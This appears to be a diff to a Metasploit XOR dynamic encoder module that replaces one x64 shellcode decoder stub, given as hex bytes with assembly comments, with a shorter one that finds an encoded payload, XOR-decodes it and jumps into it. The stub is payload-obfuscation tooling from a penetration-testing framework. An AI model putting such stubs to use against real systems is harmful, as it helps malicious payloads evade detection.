@@ -16,28 +16,29 @@ class MetasploitModule < Msf::Encoder::XorDynamic
   end
 
   def stub
-    "\xeb\x34" +              #         jmp   _call
-    "\x59" +                  # _ret:   pop   rcx
-    "\x48\x89\xcb" +          #         mov   rbx,rcx
-    "\x48\x89\xde" +          #         mov   rsi,rbx
-    "\x80\x39\x41" +          # _lp1:   cmp   BYTE PTR [rcx], 'A'
-    "\x74\x05" +              #         je    _ok
-    "\x48\xff\xc1" +          #         inc   rcx
-    "\xeb\xf6" +              #         jmp   _lp1
-    "\x48\xff\xc1" +          # _ok:    inc   rcx
-    "\x48\x89\xcf" +          #         mov   rdi, rcx
-    "\x66\x81\x39\x42\x42" +  # _lp:    cmp   WORD PTR [rcx], 'BB'
-    "\x74\x14" +              #         je    _jmp
-    "\x8a\x03" +              #         mov   al, BYTE PTR [rbx]
-    "\x30\x01" +              #         xor   BYTE PTR [rcx], al
-    "\x48\xff\xc1" +          #         inc   rcx
-    "\x48\xff\xc3" +          #         inc   rbx
-    "\x80\x3b\x41" +          #         cmp   BYTE PTR [rbx], 'A'
-    "\x75\xea" +              #         jne   _lp
-    "\x48\x89\xf3" +          #         mov   rbx, rsi
-    "\xeb\xe5" +              #         jmp   _lp
-    "\xff\xe7" +              # _jmp:   jmp   rdi
-    "\xe8\xc7\xff\xff\xff"    # _call:  call  _ret
+    "\xeb\x27" +             #        jmp    _call
+    "\x5b" +                 # _ret:  pop    rbx
+    "\x53" +                 #        push   rbx
+    "\x5f" +                 #        pop    rdi
+    "\xb0\x41" +             #        mov    al, 'A'
+    "\xfc" +                 #        cld
+    "\xae" +                 # _lp1:  scas   al, BYTE PTR es:[rdi]
+    "\x75\xfd" +             #        jne    _lp1
+    "\x57" +                 #        push   rdi
+    "\x59" +                 #        pop    rcx
+    "\x53" +                 # _lp2:  push   rbx
+    "\x5e" +                 #        pop    rsi
+    "\x8a\x06" +             # _lp3:  mov    al, BYTE PTR [rsi]
+    "\x30\x07" +             #        xor    BYTE PTR [rdi], al
+    "\x48\xff\xc7" +         #        inc    rdi
+    "\x48\xff\xc6" +         #        inc    rsi
+    "\x66\x81\x3f\x42\x42" + #        cmp    WORD PTR [rdi], 'BB'
+    "\x74\x07" +             #        je     _jmp
+    "\x80\x3e\x41" +         #        cmp    BYTE PTR [rsi], 'A'
+    "\x75\xea" +             #        jne    _lp3
+    "\xeb\xe6" +             #        jmp    _lp2
+    "\xff\xe1" +             # _jmp:  jmp    rcx
+    "\xe8\xd4\xff\xff\xff"   # _call: call   _ret
   end
 
   def stub_key_term
